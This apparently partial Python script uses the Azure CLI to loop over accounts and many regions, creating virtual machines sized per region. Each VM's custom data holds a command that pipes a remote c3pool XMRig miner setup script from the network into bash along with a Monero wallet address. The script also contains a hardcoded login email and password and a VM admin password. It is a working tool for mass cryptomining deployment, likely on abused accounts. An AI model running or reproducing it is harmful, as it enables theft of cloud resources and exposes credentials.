...
# get_default_cli().invoke("az login -u ggmgregg@outlook.com -p em4hW92cgm")
...
locations = ['eastus', 'eastus2', 'westus', 'centralus', 'northcentralus', 'southcentralus',
             ...
             'norwayeast', 'westcentralus','southindia']

# locations = ['westeurope', 'eastasia', 'japaneast',
#              'australiaeast',
#              'centralindia', 'uksouth', 'ukwest',
#              'uaenorth', 'switzerlandnorth', 'germanywestCcentral'
#              ]

# ,'germanywestcentral'
# 'koreacentral','francecentral','australiasoutheast','southindia','southeastasia','eastus2','westus2','centralus'
# 'centralindia', 'australiacentral',
...
#                               "[?localName == 'Total Regional vCPUs'].limit"], None, f)
#     limit = f.getvalue()
...
for i in range(6):
    ...
    for account in json_list[0]:
        ...
        try:
            ...
            init = "export HOME=/root&&curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 48dHXuMMCw3BMpMdHqN8jCNKDPN5WmnRZa9jEc9e9Jp6Tw9R9cv3kZCAkc1XhNmy1w4guVqYTaYbQMh53DqzhCjR44LSBn7"
            ...
            for location in locations:
                ...
                if location == "australiacentral" and type == 1:
                    size1_name = "Standard_D8s_v3"
                    size1_abbreviation = "D8s_v3"
                    size1_count=0
                    size2_name = "Standard_D2s_v3"
                    size2_abbreviation = "D2s_v3"
                    size2_count=5
        
                if location == "centralindia" and type == 1:
                    size1_name = "Standard_D8s_v3"
                    size1_abbreviation = "D8s_v3"
                    size2_name = "Standard_D2s_v3"
                    size2_abbreviation = "D2s_v3"
        
                if location == "westus2" and type == 1:
                    size1_name = "Standard_E8bds_v5"
                    size1_abbreviation = "E8bds_v5"
                    size2_name = "Standard_E2bds_v5"
                    size2_abbreviation = "E2bds_v5"
                if (location == "southeastasia" or location=="centralus") and type == 1:
                    size1_name = "Standard_E8bds_v5"
                    size1_abbreviation = "E8bds_v5"
                    size2_name = "Standard_E2bds_v5"
                    size2_abbreviation = "E2bds_v5"
                if (location == "koreacentral") and type == 1:
                    size1_name = "Standard_D8as_v4"
                    size1_abbreviation = "D8as_v4"
                    size2_name = "Standard_D2as_v4"
                    size2_abbreviation = "D2as_v4"
        
                if location == "francecentral" and type == 1:
                    size1_name = "Standard_E8as_v4"
                    size1_abbreviation = "E8as_v4"
                    size2_name = "Standard_E2as_v4"
                    size2_abbreviation = "E2as_v4"
        
                if location == "australiasoutheast" and type == 1:
                    size1_name = "Standard_DC8_v2"
                    size1_abbreviation = "DC8_v2"
                    size2_name = "Standard_DC2s_v2"
                    size2_abbreviation = "DC2s_v2"
                if (location == "southindia" or location=="eastus2") and type == 1:
                    size1_name = "Standard_DS4"
                    size1_abbreviation = "DS4"
                    size2_name = "Standard_DS2"
                    size2_abbreviation = "DS2"
                    size2_count = 0
        
                if location == "germanywestcentral" and type == 1:
                    size1_name = "Standard_L8s_v2"
                    size1_abbreviation = "L8s_v2"
                    size1_count=1
                    size2_count=0
                ...
                for a in range(0, size1_count):
                    ...
                    get_default_cli().invoke(
                        ['vm', 'create', '--resource-group', 'myResourceGroup', '--name',
                         ...
                         'azureuser', '--admin-password', '~Zmkzmk11~Zmkzmk11', '--custom-data',
